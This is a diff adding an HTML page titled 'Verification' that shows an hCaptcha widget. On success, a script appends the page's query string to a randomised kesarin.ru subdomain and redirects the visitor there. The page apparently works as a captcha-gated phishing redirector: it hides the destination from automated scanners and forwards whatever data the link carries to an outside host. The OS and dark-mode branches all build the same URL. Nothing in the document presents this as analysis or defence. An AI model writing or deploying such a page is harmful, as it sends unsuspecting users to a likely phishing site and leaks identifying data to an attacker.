@@ -1,0 +1,44 @@
+<html>
+  <head>
+    <title>Verification</title>
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+  </head>
+  
+  <body>
+    <div style="width:500px; margin:0 auto;" id="hcaptcha-demo" class="h-captcha"
+      data-sitekey="6ae29b92-3518-4b89-90a1-458f5d5a69a6" data-callback="onSuccess" data-expired-callback="onExpire">
+    </div>
+    <script>
+      // success callback
+      var onSuccess = function (response) {
+        var browserURL = new URL(window.location.href);
+        var params = new URLSearchParams(browserURL.search);
+        var data = window.location.href.split('?')[1]
+        var redurl = 'https://dlgafbdffx637a61fc58b93.kesarin.ru/'
+        // default redirect
+        var redLocation = redurl + 'M' + data
+  
+        // detect os
+        if (navigator.appVersion.indexOf('Win') != -1) {
+          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            console.log('dark mode')
+            redLocation = redurl + 'M' + data
+          } else {
+            redLocation = redurl + 'M' + data
+          }
+        }
+  
+        if (navigator.appVersion.indexOf('Macintosh') != -1) {
+          if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+            console.log('dark mode')
+            redLocation = redurl + 'M' + data
+          } else {
+            redLocation = redurl + 'M' + data
+          }
+        }
+        window.location.replace(redLocation);
+      };
+    </script>
+  </body>
+  </html>
+  
